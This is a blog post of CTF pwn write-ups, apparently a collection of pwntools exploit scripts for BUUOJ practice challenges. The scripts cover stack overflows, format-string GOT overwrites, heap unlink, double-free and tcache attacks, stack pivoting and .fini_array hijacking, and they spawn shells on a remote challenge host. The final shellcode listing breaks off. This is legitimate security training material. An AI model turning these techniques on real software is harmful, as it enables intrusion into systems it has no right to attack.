好久没做PWN题了 来波康复训练


### wustctf2020_getshell_2

![](https://raw.githubusercontent.com/Du4t/blog_image/main/20220111233126.png)
![](https://s2.loli.net/2022/01/11/GhEvuPxWwfziDF7.png)
前面有个栈溢出 直接找sh地址 然后system("sh")即可
```python
from pwn import *

# sh=process("./wustctf2020_getshell_2")
sh=remote("node4.buuoj.cn","28826")

payload='a'*(0x18+0x4)+p32(0x8048529)+p32(0x08048670)
sh.sendline(payload)
sh.interactive()
```

### axb_2019_fmt32

简单的格式化字符串 先泄漏libc 然后直接打GOT表即可
![](https://raw.githubusercontent.com/Du4t/blog_image/main/20220112001535.png)
```python
from os import system
from pwn import *
# context.log_level='debug'
# sh=process("./axb_2019_fmt32")
sh=remote("node4.buuoj.cn","27338")
libc=ELF("./libc-2.23.so")
# payload=".aaaa.%8$p"
# payload="%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p."

payload="%p"# 0x1793
sh.recvuntil(":")
sh.sendline(payload)
sh.recvuntil(":")
exit_got=int(sh.recv(9),16)+0x1793
log.info("exit_got: "+hex(exit_got))

puts_got=exit_got-0x4
payload2=".{}.%8$s".format(p32(puts_got))
sh.sendline(payload2)

sh.recvuntil(".")
sh.recvuntil(".")
puts_got=u32(sh.recv(4))
log.info("puts_got: "+hex(puts_got))
libc_base=puts_got-libc.symbols['puts']
log.info("libc_base: "+hex(libc_base))
one_addr=libc_base+0x3a80c
log.info("one_addr: "+hex(one_addr))
printf_got=exit_got-0xc


payload3="."+fmtstr_payload(8,{printf_got:one_addr},0xa)
sh.recvuntil(":")
sh.sendline(payload3)

payload4="a"*0x210
sh.recvuntil(":")
sh.sendline(payload4)
# gdb.attach(sh)
# pause()
sh.interactive()
```


### ciscn_s_4
这题一生之敌 本地通了 远程不通 网上主要思路是栈迁移 但是我的思路是栈溢出 这里是可以溢出到返回地址的 那么通过第一次的输入 带出来一个地址 来计算libc_base 最后直接ogg打上去即可
```python
from pwn import *
# context.log_level='debug'
# sh=process("./ciscn_s_4")
sh=remote("node4.buuoj.cn","25866")
libc=ELF("libc-2.27.so")
# libc=ELF("/lib/i386-linux-gnu/libc.so.6")

sh.recvuntil("?")
payload="a"*0x20
sh.sendline(payload)

sh.recvuntil("\n")
sh.recvuntil("\n")

sh.recv(15)
dl_fini=u32(sh.recv(4))
log.info("dl_fini: "+hex(dl_fini))
libc_base=dl_fini-0x1f0b40-libc.sym['__libc_start_main']-0xe0
log.info("libc_base:"+hex(libc_base))
gets_addr=libc_base+libc.symbols['gets']
one_addr=libc_base+0x3cbea
log.info("one_addr: "+hex(one_addr))
# gdb.attach(sh)
payload2='a'*(0x30-0x4)+p32(one_addr)
sh.sendline(payload2)


sh.interactive()
```

### hitcon2014_stkof
这题是unlink 感觉还可以 换了新模版 刚开始以为是打IO
```python
#!/usr/bin/env python2
# -*- coding: utf-8 -*- #
# @偏有宸机_Exploit-Template
# Exploiting: python exploit.py [IP PORT] [Exploit_Template]
# Edit values:
#      - RemPro()
#           - elf_addr
#           - pro_libc
#           - enable_Onegadgets
#      - exp()

import os
import sys
import subprocess
from elftools.construct import lib
from pwn import *
from one_gadget import generate_one_gadget 
# context.terminal = ["tmux","new-window"]
# context.terminal = ["tmux","splitw","-h"]
context.arch = "amd64"
# context.arch = "i386"
# context.log_level = "debug"

### 远程本地连接
def RemPro(ip='',port=''):
    global sh,elf,libc,one_ggs
    elf_addr = "./stkof"                                   # 本地ELF
    pro_libc = "libc-2.23.so"       # Libc文件
    rem_libc = "./libc-2.23.so"
    if len(sys.argv) > 2 :
        sh = remote(sys.argv[1],sys.argv[2])
        try:
            libc = ELF(rem_libc)
            pro_libc = rem_libc
        except:
            log.info("No set Remote_libc...")
            libc = ELF(pro_libc)
    else:
        libc = ELF(pro_libc)
        try:
            sh = remote(ip,port)
            libc = ELF(rem_libc)
            pro_libc = rem_libc
            log.info("Remote Start...")
        except:
            sh = process(elf_addr)
            log.info("Local Start...")
    # one_ggs = [0x45226, 0x4527a, 0xf0364,0xf1207]
    # one_ggs = one_gadget(pro_libc)
    elf = ELF(elf_addr)
    return 1

### 调试用
def debug(cmd=""):
    if len(sys.argv) <= 2:
        log.progress("Loading Debug....")
        gdb.attach(sh,cmd)
### One_Gadget
# def one_gadget(filename):
#     log.progress("Leak One_Gadgets...")
#     one_ggs = str(subprocess.check_output(['one_gadget', '--raw', '-f',filename]))[2:-3].split(' ')
#     return list(map(int,one_ggs))
def one_gadget(libc_addr):
    log.progress("Leak One_Gadgets...")
    path_to_libc=libc_addr
    gadget =[]
    for offset in generate_one_gadget(path_to_libc):
        gadget.append(int(offset))
    return gadget
    # one_gg = one_gadget("/lib/x86_64-linux-gnu/libc.so.6")

def new(size):
    sh.sendline("1")
    sh.sendline(str(size))

def edit(idx,length,content):
    sh.sendline('2')
    sh.sendline(str(idx))
    sh.sendline(str(length))
    sh.send(content)

def delete(idx):
    sh.sendline('3')
    sh.sendline(str(idx))

def show(idx):
    sh.sendline('4')
    sh.sendline(str(idx))

def exp():

   	"""
   	...EXP...
    success("info_success")								# 正确提示信息
    info("info_info")									# 提示信息
    info.progress("info_progress")						# 加载信息
    debug()												# 加载GDB调试
   	"""
    
def exp_2():
    p_list=0x602150
    new(0x10)
    
    new(0x80)
    new(0x80)
    edit(2,0x90,p64(0)+p64(0x81)+p64(p_list-0x18)+p64(p_list-0x10)+'\x00'*0x60+p64(0x80)+p64(0x90))
    delete(3)

    puts_plt=elf.plt['puts']
    strlen_got=elf.got['strlen']
    puts_got=elf.got['puts']
    edit(2,0x18,'a'*0x10+p64(strlen_got))
    edit(1,0x8,p64(puts_plt))
    edit(2,0x18,'a'*0x10+p64(puts_got))
    show(1)
    puts_got=u64(sh.recvuntil("...",drop=False)[-10:-4].ljust(8,'\x00'))
    info("puts_got: "+hex(puts_got))
    libc_base=puts_got-libc.symbols['puts']
    info("libc_base: "+hex(libc_base))
    one_addr=libc_base+one_gadget("libc-2.23.so")[1]
    info("one_addr: "+hex(one_addr))
    malloc_hook=libc_base+libc.symbols['__malloc_hook']
    info("malloc_hook: "+hex(malloc_hook))

    edit(2,0x18,'a'*0x10+p64(malloc_hook))
    edit(1,0x8,p64(one_addr))

    new(0x20)    


    

    # debug()

    
if __name__=="__main__":
    RemPro()
    if len(sys.argv) > 3 :
        eval(sys.argv[3])()
    elif (len(sys.argv)>1 and len(sys.argv)<3):
        eval(sys.argv[1])()
    else:
        exp_2()
    sh.interactive()
    
```

### ciscn_s_9
简单ROP
```python
#!/usr/bin/env python2
# -*- coding: utf-8 -*- #
# @偏有宸机_Exploit-Template
# Exploiting: python exploit.py [IP PORT] [Exploit_Template]
# Edit values:
#      - RemPro()
#           - elf_addr
#           - pro_libc
#           - enable_Onegadgets
#      - exp()

import os
import sys
import subprocess
from pwn import *
from one_gadget import generate_one_gadget 
# context.terminal = ["tmux","new-window"]
# context.terminal = ["tmux","splitw","-h"]
# context.arch = "amd64"
context.arch = "i386"
context.log_level = "debug"

### 远程本地连接
def RemPro(ip='',port=''):
    global sh,elf,libc,one_ggs
    elf_addr = "ciscn_s_9"                                   # 本地ELF
    pro_libc = "/lib/x86_64-linux-gnu/libc.so.6"       # Libc文件
    rem_libc = "./libc-2.27.so"
    if len(sys.argv) > 2 :
        sh = remote(sys.argv[1],sys.argv[2])
        try:
            libc = ELF(rem_libc)
            pro_libc = rem_libc
        except:
            log.info("No set Remote_libc...")
            libc = ELF(pro_libc)
    else:
        libc = ELF(pro_libc)
        try:
            sh = remote(ip,port)
            libc = ELF(rem_libc)
            pro_libc = rem_libc
            log.info("Remote Start...")
        except:
            sh = process(elf_addr)
            log.info("Local Start...")
    # one_ggs = [0x45226, 0x4527a, 0xf0364,0xf1207]
    # one_ggs = one_gadget(pro_libc)
    elf = ELF(elf_addr)
    return 1

### 调试用
def debug(cmd=""):
    if len(sys.argv) <= 2:
        log.progress("Loading Debug....")
        gdb.attach(sh,cmd)
### One_Gadget
# def one_gadget(filename):
#     log.progress("Leak One_Gadgets...")
#     one_ggs = str(subprocess.check_output(['one_gadget', '--raw', '-f',filename]))[2:-3].split(' ')
#     return list(map(int,one_ggs))
def one_gadget(libc_addr):
    log.progress("Leak One_Gadgets...")
    path_to_libc=libc_addr
    gadget =[]
    for offset in generate_one_gadget(path_to_libc):
        gadget.append(int(offset))
    return gadget
    # one_gg = one_gadget("/lib/x86_64-linux-gnu/libc.so.6")

def exp():
    sh.recvuntil(">")
    puts_plt=elf.plt['puts']
    fgets_got=elf.got['fgets']
    main=0x8048559
    payload='a'*0x24+p32(puts_plt)+p32(main)+p32(fgets_got)  
    info("length: "+hex(len(payload)))
    sh.sendline(payload)
    sh.recvuntil("~\n")
    fgets_got=u32(sh.recv(4))
    info("fgets_got: "+hex(fgets_got))
    libc_base=fgets_got-libc.symbols['fgets']
    info("libc_base: "+hex(libc_base))
    ogg=libc_base+0x13573f
    info("ogg: "+hex(ogg))
    system_addr=libc_base+libc.symbols['system']
    bin_addr=libc_base+libc.search('/bin/sh').next()
    
    sh.recvuntil(">")
    payload='a'*0x24+p32(system_addr)+p32(0)+p32(bin_addr)
    sh.sendline(payload)
    # debug()

    
if __name__=="__main__":
    RemPro()
    if len(sys.argv) > 3 :
        eval(sys.argv[3])()
    elif (len(sys.argv)>1 and len(sys.argv)<3):
        eval(sys.argv[1])()
    else:
        exp()
    sh.interactive()
```

### hacknote
本身只是一个double_free加上UAF 这题麻烦在 最后ogg打不通 可以使用system来动态调用执行`/bin/sh` 但是前面的地址会阻碍到执行 这里使用`;sh`来实现隔离指令执行
```python
#!/usr/bin/env python2
# -*- coding: utf-8 -*- #
# @偏有宸机_Exploit-Template
# Exploiting: python exploit.py [IP PORT] [Exploit_Template]
# Edit values:
#      - RemPro()
#           - elf_addr
#           - pro_libc
#           - enable_Onegadgets
#      - exp()

import os
import sys
import subprocess
from pwn import *
from one_gadget import generate_one_gadget 
# context.terminal = ["tmux","new-window"]
# context.terminal = ["tmux","splitw","-h"]
# context.arch = "amd64"
context.arch = "i386"
# context.log_level = "debug"

### 远程本地连接
def RemPro(ip='',port=''):
    global sh,elf,libc,one_ggs
    elf_addr = "hacknote"                                   # 本地ELF
    pro_libc = "libc-2.23_32.so"       # Libc文件
    rem_libc = "libc-2.23_32.so"
    if len(sys.argv) > 2 :
        sh = remote(sys.argv[1],sys.argv[2])
        try:
            libc = ELF(rem_libc)
            pro_libc = rem_libc
        except:
            log.info("No set Remote_libc...")
            libc = ELF(pro_libc)
    else:
        libc = ELF(pro_libc)
        try:
            sh = remote(ip,port)
            libc = ELF(rem_libc)
            pro_libc = rem_libc
            log.info("Remote Start...")
        except:
            sh = process(elf_addr)
            log.info("Local Start...")
    # one_ggs = [0x45226, 0x4527a, 0xf0364,0xf1207]
    # one_ggs = one_gadget(pro_libc)
    elf = ELF(elf_addr)
    return 1

### 调试用
def debug(cmd=""):
    if len(sys.argv) <= 2:
        log.progress("Loading Debug....")
        gdb.attach(sh,cmd)
### One_Gadget
# def one_gadget(filename):
#     log.progress("Leak One_Gadgets...")
#     one_ggs = str(subprocess.check_output(['one_gadget', '--raw', '-f',filename]))[2:-3].split(' ')
#     return list(map(int,one_ggs))
def one_gadget(libc_addr):
    log.progress("Leak One_Gadgets...")
    path_to_libc=libc_addr
    gadget =[]
    for offset in generate_one_gadget(path_to_libc):
        gadget.append(int(offset))
    return gadget
    # one_gg = one_gadget("/lib/x86_64-linux-gnu/libc.so.6")

sl=lambda s:sh.sendline(s)
sd=lambda s:sh.send(s)
ru=lambda s:sh.recvuntil(s)
rv=lambda s:sh.recv(s)

def add(size,content):
    ru(":")
    sl('1')
    ru(":")
    sl(str(size))
    ru(":")
    sl(content)

def delete(idx):
    ru(":")
    sl('2')
    ru(":")
    sl(str(idx))

def show(idx):
    ru(":")
    sl('3')
    ru(":")
    sl(str(idx))

def exp():
    add(0x30,'aa')
    add(0x30,'bb')
    delete(0)
    delete(1)
    delete(0)
    puts_got=elf.got['puts']
    add(0x8,p32(0x804862b)+p32(puts_got))
    show(1)
    sl('1')
    sh.recvuntil(":")
    puts_got=u32(sh.recv(4))
    info("puts_got: "+hex(puts_got))
    libc_base=puts_got-libc.symbols['puts']
    info("libc_base: "+hex(libc_base))
    ogg=libc_base+0x3a80e
    info("ogg: "+hex(ogg))
    system_addr=libc_base+libc.symbols['system']
    delete(0)
    add(0x8,p32(system_addr)+';sh')

    # show(1)

    # debug()

    
if __name__=="__main__":
    RemPro()
    if len(sys.argv) > 3 :
        eval(sys.argv[3])()
    elif (len(sys.argv)>1 and len(sys.argv)<3):
        eval(sys.argv[1])()
    else:
        exp()
    sh.interactive()
    


```

### npuctf_2020_easyheap
堆溢出
```python
#!/usr/bin/env python2
# -*- coding: utf-8 -*- #
# @偏有宸机_Exploit-Template
# Exploiting: python exploit.py [IP PORT] [Exploit_Template]
# Edit values:
#      - RemPro()
#           - elf_addr
#           - pro_libc
#           - enable_Onegadgets
#      - exp()

import os
import sys
import subprocess
from pwn import *
from one_gadget import generate_one_gadget 
# context.terminal = ["tmux","new-window"]
# context.terminal = ["tmux","splitw","-h"]
context.arch = "amd64"
# context.arch = "i386"
# context.log_level = "debug"

### 远程本地连接
def RemPro(ip='',port=''):
    global sh,elf,libc,one_ggs
    elf_addr = "./npuctf_2020_easyheap"                                   # 本地ELF
    pro_libc = "libc-2.27_64.so"       # Libc文件
    rem_libc = "libc-2.27_64.so"
    if len(sys.argv) > 2 :
        sh = remote(sys.argv[1],sys.argv[2])
        try:
            libc = ELF(rem_libc)
            pro_libc = rem_libc
        except:
            log.info("No set Remote_libc...")
            libc = ELF(pro_libc)
    else:
        libc = ELF(pro_libc)
        try:
            sh = remote(ip,port)
            libc = ELF(rem_libc)
            pro_libc = rem_libc
            log.info("Remote Start...")
        except:
            sh = process(elf_addr)
            log.info("Local Start...")
    # one_ggs = [0x45226, 0x4527a, 0xf0364,0xf1207]
    # one_ggs = one_gadget(pro_libc)
    elf = ELF(elf_addr)
    return 1

### 调试用
def debug(cmd=""):
    if len(sys.argv) <= 2:
        log.progress("Loading Debug....")
        gdb.attach(sh,cmd)
### One_Gadget
# def one_gadget(filename):
#     log.progress("Leak One_Gadgets...")
#     one_ggs = str(subprocess.check_output(['one_gadget', '--raw', '-f',filename]))[2:-3].split(' ')
#     return list(map(int,one_ggs))
def one_gadget(libc_addr):
    log.progress("Leak One_Gadgets...")
    path_to_libc=libc_addr
    gadget =[]
    for offset in generate_one_gadget(path_to_libc):
        gadget.append(int(offset))
    return gadget
    # one_gg = one_gadget("/lib/x86_64-linux-gnu/libc.so.6")

ru=lambda s:sh.recvuntil(s) 
rv=lambda s:sh.recv(s)
sd=lambda s:sh.send(s)
sl=lambda s:sh.sendline(s)

def new(size,content):
    ru(":")
    sl('1')
    ru(":")
    sl(str(size))
    ru(":")
    sl(content)

def edit(idx,content):
    ru(":")
    sl('2')
    ru(":")
    sl(str(idx))
    ru(":")
    sd(content)

def show(idx):
    ru(":")
    sl('3')
    ru(":")
    sl(str(idx))

def delete(idx):
    ru(":")
    sl('4')
    ru(":")
    sl(str(idx))  

def exp():
    atoi_got=elf.got['atoi']
    new(0x18,'aaa')
    new(0x18,'bbb')
    edit(0,'a'*0x18+'\x41')
    delete(1)
    new(0x38,'cc')
    edit(1,'c'*0x18+p64(0x21)+p64(0x38)+p64(atoi_got))
    show(1)
    ru("Content :")
    rv(1)
    atoi_got=u64(rv(6).ljust(8,'\x00'))
    info("atoi_got: "+hex(atoi_got))
    libc_base=atoi_got-libc.sym['atoi']
    info("libc_base: "+hex(libc_base))
    ogg=libc_base+one_gadget("libc-2.27_64.so")[0]
    info("ogg_addr: "+hex(ogg))
    edit(1,p64(ogg))
    # debug()

    
if __name__=="__main__":
    RemPro()
    if len(sys.argv) > 3 :
        eval(sys.argv[3])()
    elif (len(sys.argv)>1 and len(sys.argv)<3):
        eval(sys.argv[1])()
    else:
        exp()
    sh.interactive()
```

### ACTF_2019_babystack
栈迁移 踩了个坑 主要是send写成了sendline导致缓冲区里 有个`\n` 在返回主函数之后直接推出了..
```python
#!/usr/bin/env python2
# -*- coding: utf-8 -*- #
# @偏有宸机_Exploit-Template
# Exploiting: python exploit.py [IP PORT] [Exploit_Template]
# Edit values:
#      - RemPro()
#           - elf_addr
#           - pro_libc
#           - enable_Onegadgets
#      - exp()

import os
import sys
import subprocess
from pwn import *
from one_gadget import generate_one_gadget 
# context.terminal = ["tmux","new-window"]
# context.terminal = ["tmux","splitw","-h"]
context.arch = "amd64"
# context.arch = "i386"
# context.log_level = "debug"

### 远程本地连接
def RemPro(ip='',port=''):
    global sh,elf,libc,one_ggs
    elf_addr = "./ACTF_2019_babystack"                                   # 本地ELF
    pro_libc = "/lib/x86_64-linux-gnu/libc.so.6"       # Libc文件
    rem_libc = "../../libc-2.27_64.so"
    if len(sys.argv) > 2 :
        sh = remote(sys.argv[1],sys.argv[2])
        try:
            libc = ELF(rem_libc)
            pro_libc = rem_libc
        except:
            log.info("No set Remote_libc...")
            libc = ELF(pro_libc)
    else:
        libc = ELF(pro_libc)
        try:
            sh = remote(ip,port)
            libc = ELF(rem_libc)
            pro_libc = rem_libc
            log.info("Remote Start...")
        except:
            sh = process(elf_addr)
            log.info("Local Start...")
    # one_ggs = [0x45226, 0x4527a, 0xf0364,0xf1207]
    # one_ggs = one_gadget(pro_libc)
    elf = ELF(elf_addr)
    return 1

### 调试用
def debug(cmd=""):
    if len(sys.argv) <= 2:
        log.progress("Loading Debug....")
        gdb.attach(sh,cmd)
### One_Gadget
# def one_gadget(filename):
#     log.progress("Leak One_Gadgets...")
#     one_ggs = str(subprocess.check_output(['one_gadget', '--raw', '-f',filename]))[2:-3].split(' ')
#     return list(map(int,one_ggs))
def one_gadget(libc_addr):
    log.progress("Leak One_Gadgets...")
    path_to_libc=libc_addr
    gadget =[]
    for offset in generate_one_gadget(path_to_libc):
        gadget.append(int(offset))
    return gadget
    # one_gg = one_gadget("/lib/x86_64-linux-gnu/libc.so.6")

ru=lambda s:sh.recvuntil(s) 
rv=lambda s:sh.recv(s)
sd=lambda s:sh.send(s)
sl=lambda s:sh.sendline(s)


def exp():
    leave_ret=0x0000000000400a18
    pop_rdi=0x0000000000400ad3
    main_addr=0x4008f6
    puts_got=elf.got['puts']
    puts_plt=elf.plt['puts']
    ru(">")
    sl(str(0xe0))
    ru("at ")
    stack_addr=int(rv(14),16)
    info("stack_addr: "+hex(stack_addr))
    info("leave_ret: "+hex(leave_ret))
    payload=p64(stack_addr)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main_addr)
    payload=payload.ljust(0xd0)+p64(stack_addr)+p64(leave_ret)
    ru(">")
    sd(payload)
    
    ru("~\n")
    puts_got=u64(rv(6).ljust(8,'\x00'))
    info("puts_got: "+hex(puts_got))
    libc_base=puts_got-libc.symbols['puts']
    info("libc_base: "+hex(libc_base))
    ogg=libc_base+0x4f2c5
    info("ogg: "+hex(ogg))
    system_addr=libc_base+libc.sym['system']
    binsh=libc_base+libc.search('/bin/sh').next()

    ru(">")
    sl(str(0xe0))
    ru(">")
    payload2='\x00'*0xd8+p64(ogg)
    sl(payload2)


if __name__=="__main__":
    RemPro()
    if len(sys.argv) > 3 :
        eval(sys.argv[3])()
    elif (len(sys.argv)>1 and len(sys.argv)<3):
        eval(sys.argv[1])()
    else:
        exp()
    sh.interactive()
```

### wdb_2018_2nd_easyfmt
```python
#!/usr/bin/env python2
# -*- coding: utf-8 -*- #
# @偏有宸机_Exploit-Template
# Exploiting: python exploit.py [IP PORT] [Exploit_Template]
# Edit values:
#      - RemPro()
#           - elf_addr
#           - pro_libc
#           - enable_Onegadgets
#      - exp()

import os
import sys
import subprocess
from pwn import *
from one_gadget import generate_one_gadget 
# context.terminal = ["tmux","new-window"]
# context.terminal = ["tmux","splitw","-h"]
# context.arch = "amd64"
context.arch = "i386"
# context.log_level = "debug"

### 远程本地连接
def RemPro(ip='',port=''):
    global sh,elf,libc,one_ggs
    elf_addr = "./wdb_2018_2nd_easyfmt"                                   # 本地ELF
    pro_libc = "libc-2.23_32.so"       # Libc文件
    rem_libc = "libc-2.23_32.so"
    if len(sys.argv) > 2 :
        sh = remote(sys.argv[1],sys.argv[2])
        try:
            libc = ELF(rem_libc)
            pro_libc = rem_libc
        except:
            log.info("No set Remote_libc...")
            libc = ELF(pro_libc)
    else:
        libc = ELF(pro_libc)
        try:
            sh = remote(ip,port)
            libc = ELF(rem_libc)
            pro_libc = rem_libc
            log.info("Remote Start...")
        except:
            sh = process(elf_addr)
            log.info("Local Start...")
    # one_ggs = [0x45226, 0x4527a, 0xf0364,0xf1207]
    # one_ggs = one_gadget(pro_libc)
    elf = ELF(elf_addr)
    return 1

### 调试用
def debug(cmd=""):
    if len(sys.argv) <= 2:
        log.progress("Loading Debug....")
        gdb.attach(sh,cmd)
### One_Gadget
# def one_gadget(filename):
#     log.progress("Leak One_Gadgets...")
#     one_ggs = str(subprocess.check_output(['one_gadget', '--raw', '-f',filename]))[2:-3].split(' ')
#     return list(map(int,one_ggs))
def one_gadget(libc_addr):
    log.progress("Leak One_Gadgets...")
    path_to_libc=libc_addr
    gadget =[]
    for offset in generate_one_gadget(path_to_libc):
        gadget.append(int(offset))
    return gadget
    # one_gg = one_gadget("/lib/x86_64-linux-gnu/libc.so.6")

ru=lambda s:sh.recvuntil(s) 
rv=lambda s:sh.recv(s)
sd=lambda s:sh.send(s)
sl=lambda s:sh.sendline(s)


def exp():
    ru("?")
    payload=p32(elf.got['puts'])+'.'+'%6$s'
    sl(payload)
    
    ru(".")
    puts_got=u32(rv(4))
    info("puts_got: "+hex(puts_got))
    libc_base=puts_got-libc.sym['puts']
    info("libc_base: "+hex(libc_base))
    ogg=libc_base+0x3a80c
    info("ogg: "+hex(ogg))
    system_addr=libc_base+libc.sym['system']
    
    payload2=fmtstr_payload(6,{elf.got['printf']:system_addr})
    # ru("?")
    sl(payload2)

    debug()

    
if __name__=="__main__":
    RemPro()
    if len(sys.argv) > 3 :
        eval(sys.argv[3])()
    elif (len(sys.argv)>1 and len(sys.argv)<3):
        eval(sys.argv[1])()
    else:
        exp()
    sh.interactive()
    

```

### x_ctf_b0verfl0w
```python
#!/usr/bin/env python2
# -*- coding: utf-8 -*- #
# @偏有宸机_Exploit-Template
# Exploiting: python exploit.py [IP PORT] [Exploit_Template]
# Edit values:
#      - RemPro()
#           - elf_addr
#           - pro_libc
#           - enable_Onegadgets
#      - exp()

import os
import sys
import subprocess
from pwn import *
from one_gadget import generate_one_gadget 
# context.terminal = ["tmux","new-window"]
# context.terminal = ["tmux","splitw","-h"]
# context.arch = "amd64"
context.arch = "i386"
context.log_level = "debug"

### 远程本地连接
def RemPro(ip='',port=''):
    global sh,elf,libc,one_ggs
    elf_addr = "./b0verfl0w"                                   # 本地ELF
    pro_libc = "libc-2.23_32.so"       # Libc文件
    rem_libc = "libc-2.23_32.so"
    if len(sys.argv) > 2 :
        sh = remote(sys.argv[1],sys.argv[2])
        try:
            libc = ELF(rem_libc)
            pro_libc = rem_libc
        except:
            log.info("No set Remote_libc...")
            libc = ELF(pro_libc)
    else:
        libc = ELF(pro_libc)
        try:
            sh = remote(ip,port)
            libc = ELF(rem_libc)
            pro_libc = rem_libc
            log.info("Remote Start...")
        except:
            sh = process(elf_addr)
            log.info("Local Start...")
    # one_ggs = [0x45226, 0x4527a, 0xf0364,0xf1207]
    # one_ggs = one_gadget(pro_libc)
    elf = ELF(elf_addr)
    return 1

### 调试用
def debug(cmd=""):
    if len(sys.argv) <= 2:
        log.progress("Loading Debug....")
        gdb.attach(sh,cmd)
### One_Gadget
# def one_gadget(filename):
#     log.progress("Leak One_Gadgets...")
#     one_ggs = str(subprocess.check_output(['one_gadget', '--raw', '-f',filename]))[2:-3].split(' ')
#     return list(map(int,one_ggs))
def one_gadget(libc_addr):
    log.progress("Leak One_Gadgets...")
    path_to_libc=libc_addr
    gadget =[]
    for offset in generate_one_gadget(path_to_libc):
        gadget.append(int(offset))
    return gadget
    # one_gg = one_gadget("/lib/x86_64-linux-gnu/libc.so.6")

ru=lambda s:sh.recvuntil(s) 
rv=lambda s:sh.recv(s)
sd=lambda s:sh.send(s)
sl=lambda s:sh.sendline(s)


def exp():
    payload='a'*0x24+p32(elf.plt['puts'])+p32(0x804850e)+p32(elf.got['puts'])
    ru("?")
    sl(payload)
    ru(".")
    puts_got=u32(rv(4))
    info("puts_got: "+hex(puts_got))
    libc_base=puts_got-libc.sym['puts']
    info("libc_base: "+hex(libc_base))
    ogg=libc_base+0x3a812
    system_addr=libc_base+libc.sym['system']
    sh_addr=libc_base+libc.search('/bin/sh').next()
    info("system_addr: "+hex(system_addr))

    payload2='a'*0x24+p32(system_addr)+p32(0x804850e)+p32(sh_addr)
    ru("?")
    debug()

    sl(payload2)
    
if __name__=="__main__":
    RemPro()
    if len(sys.argv) > 3 :
        eval(sys.argv[3])()
    elif (len(sys.argv)>1 and len(sys.argv)<3):
        eval(sys.argv[1])()
    else:
        exp()
    sh.interactive()
    


```

### suctf_2018_basic_pwn
```python
def exp():
    payload='a'*0x118+p64(0x401157)
    sl(payload)
```

### ciscn_2019_es_1
```python
def exp():
    malloc(0x80,'aa','aa')
    malloc(0x10,'p','p')
    for i in range(8):
        delete(0)
    show(0)
    ru(":")
    rv(1)
    main_arena=u64(rv(6).ljust(8,'\x00'))-96
    info("main_arena: "+hex(main_arena))
    libc_base=main_arena-0x3ebc40
    info("libc_base: "+hex(libc_base))
    malloc_hook=libc_base+libc.sym['__malloc_hook']
    info("malloc_hook: "+hex(malloc_hook))
    ogg=libc_base+0x4f322
    info("ogg: "+hex(ogg))
    realloc_hook=libc_base+libc.symbols['__realloc_hook']
    free_hook=libc_base+libc.sym['__free_hook']

    malloc(0x68,'cc','aa')
    malloc(0x68,'dd','bb')
    delete(2)
    delete(2)
    # debug()
    malloc(0x68,p64(free_hook),p64(free_hook))
    malloc(0x68,p64(free_hook),p64(free_hook))
    malloc(0x68,p64(ogg),p64(ogg))
```

### ciscn_s_2
有两个小trick
```python
def exp():
    create(0,'') # 这里有个小trick realloc(ptr,size)如果size是0的话 效果等同于free()
    edit(0,'')
    delete(0) # 这样就做成了double_free
    create(0x10,p64(0))
    create(0x10,'protect')
    show(0)
    ru("Content: ")
    heap_base=u64(rv(6).ljust(8,'\x00'))-0xa0-0x200
    info("heap_base: "+hex(heap_base))
    create(0x500,'aaa') # 这里还有一个小trick 当size足够大的时候 free会直接进unsorted bin 而不是tcache
    create(0x10,'/bin/sh\x00')
    delete(2)
    edit(0,p64(heap_base+0x2d0+0x10)+'\x80')


    show(1)
    ru("Content: ")
    main_arena=u64(rv(6).ljust(8,'\x00'))-96
    info("main_arena: "+hex(main_arena))
    libc_base=main_arena-0x3ebc40
    success("libc_base: "+hex(libc_base))
    ogg=libc_base+0x10a38c
    info("ogg: "+hex(ogg))
    free_hook=libc_base+libc.symbols['__free_hook']
    info("free_hook: "+hex(free_hook))
    malloc_hook=libc_base+libc.symbols['__malloc_hook']
    info("malloc_hook: "+hex(malloc_hook))
    system_addr=libc_base+libc.symbols['system']
    info("system_addr: "+hex(system_addr))


    create(0x500,'')
    create(0,'')
    edit(4,'')
    delete(4)
    create(0x10,p64(0))
    # create(0x10,'')
    edit(4,p64(free_hook)+'\x08')
    create(0x10,p64(system_addr))
    # edit(5,'a'*0x13+p64(ogg))
    # delete(5)
    # delete(4)
    # debug()
```

### pwnable_echo1

```python
def exp():
    puts_plt=elf.plt['puts']
    puts_got=elf.got['puts']
    pop_rdi=asm("pop rdi;ret")
    rdi_addr=0x6020A0
    main_addr=0x4008b1
    ru(":")
    sl(pop_rdi)
    ru(">")
    sl('1')
    payload='a'*0x28+p64(rdi_addr)+p64(puts_got)+p64(puts_plt)+p64(main_addr)
    sl(payload)

    ru("\n")
    ru("\n")
    ru("\n")
    puts_got=u64(rv(6).ljust(8,'\x00'))
    info("puts_got: "+hex(puts_got))
    libc_base=puts_got-libc.sym['puts']
    info("libc_base: "+hex(libc_base))
    sh_addr=libc_base+libc.search("/bin/sh").next()
    system_addr=libc_base+libc.sym['system']
    
    ru(":")
    sl(pop_rdi)
    ru(">")
    sl('1')
    payload2='a'*0x28+p64(rdi_addr)+p64(sh_addr)+p64(system_addr)
    sl(payload2)
```

### pwnable_317

这题用的是劫持.fini_array 控制程序流程
```python
def exp():
    fini_array=0x4b40f0
    fini_addr=0x402960
    main_addr=0x401B6D
    target=0x4b4100
    pop_rdi=0x401696
    pop_rax=0x41e4af
    pop_rdx_rsi=0x44a309
    bin_sh_addr=0x4b4140
    sys_call=0x446e2c
    leave_ret=0x401c4b

    ru(":")
    sd(str(fini_array))
    ru(":")
    sd(p64(fini_addr)+p64(main_addr))

    ru(":")
    sd(str(target))
    ru(":")
    sd(p64(pop_rdi))
   
    ru(":")
    sd(str(target+8))
    ru(":")
    sd(p64(bin_sh_addr)+p64(pop_rax)+p64(0x3b))

    ru(":")
    sd(str(target+0x20))
    ru(":")
    sd(p64(pop_rdx_rsi)+p64(0)+p64(0))

    ru(":")
    sd(str(target+0x38))
    ru(":")
    sd(p64(sys_call)+'/bin/sh\x00')

    ru(":")
    sd(str(fini_array))
    ru(":")
    sd(p64(leave_ret))
```

### gwctf_2019_shellcode
这题有意思 可见字符orw  有两种方法
```python
def exp():
    # ru(":")
    # payload=asm(shellcraft.open("flag")+shellcraft.read('eax','esp',100)+shellcraft.write(1,'esp',100))
    payload='''
		push 0
		mov  rax,0x67616c662f2e
		push rax
		mov  rdi,rsp
		xor  rsi,rsi
		xor  rdx,rdx
		xor  rax,rax
		mov  al,0x2
		syscall
